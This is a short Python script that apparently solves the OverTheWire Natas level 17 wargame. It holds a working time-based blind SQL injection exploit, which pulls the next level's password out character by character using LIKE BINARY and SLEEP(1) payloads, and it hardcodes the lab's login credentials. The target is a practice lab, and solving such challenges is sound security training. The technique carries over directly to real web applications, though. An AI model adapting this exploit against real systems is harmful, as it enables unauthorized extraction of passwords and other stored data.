import string
import requests
import time

url = "http://natas17.natas.labs.overthewire.org/index.php?debug&username="
password = ""
candidates = f"{string.digits}{string.ascii_letters}"

query = 'natas18" AND password LIKE BINARY "{}%" AND SLEEP(1)%23'
for _ in range(32):
    for c in candidates:
        sent = time.time()
        resp = requests.get(
            url + query.format(password + c),
            auth=("natas17", "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"),
        )
        elapsed = time.time() - sent
        if elapsed > 1:
            password += c
            print(password)
            break
